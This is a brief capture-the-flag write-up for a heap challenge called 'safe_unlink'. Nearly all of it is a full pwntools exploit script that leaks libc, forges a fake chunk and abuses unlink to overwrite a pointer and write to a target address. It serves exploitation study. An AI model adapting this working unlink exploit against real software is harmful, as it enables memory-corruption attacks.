![](./safe_unlink-1783818906794.webp)

![](./safe_unlink-1783818931997.webp)

the challenge contains no pie, which mean that we can easily access the target

pretty straight forward as the challenge name, we can perform a safe unlink to rewrite the pointer that is used to edit the data with the target's address, thus edit the target itself

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("safe_unlink")
libc = exe.libc

context.binary = exe
context.log_level="debug"
context.arch="x86_64"

zero=b"\x00"

script='''
    c
'''

def edit(id,data):
    r.recvuntil("> ")
    r.sendline(str(2).encode())
    r.recvuntil("index: ")
    r.sendline(str(id).encode())
    r.recvuntil("data: ")
    r.sendline(data)

def malloc(sz):
    r.recvuntil("> ")
    r.sendline(str(1).encode())
    r.recvuntil("size: ")
    r.sendline(str(sz).encode())

def free(id):
    r.recvuntil("> ")
    r.sendline(str(3).encode())
    r.recvuntil("index: ")
    r.sendline(str(id).encode())

def main():
    global r
    r = gdb.debug(exe.path, gdbscript=script)
    # r = process(exe.path)

    r.recvuntil("puts() @ 0x")
    data=r.recvline()
    data=data[:12]

    puts_libc=int(data,16)
    libc_base=puts_libc-libc.sym["puts"]
    addr=0x602060
    target=0x602010

    malloc(0x98)
    malloc(0x98)

    payload=flat(
        0,
        0x91,
        addr-0x18,
        addr-0x10
    )

    payload=payload.ljust(0x90, zero)

    payload=flat(
        payload,
        0x90,
        0xa0
    )

    edit(0,payload)
    free(1)

    payload=flat(
        0,
        0,
        0,
        target
    )

    edit(0, payload)
    
    payload=flat(
        "PWNED",
        0
    )

    edit(0, payload)

    r.interactive()


if __name__ == "__main__":
    main()
```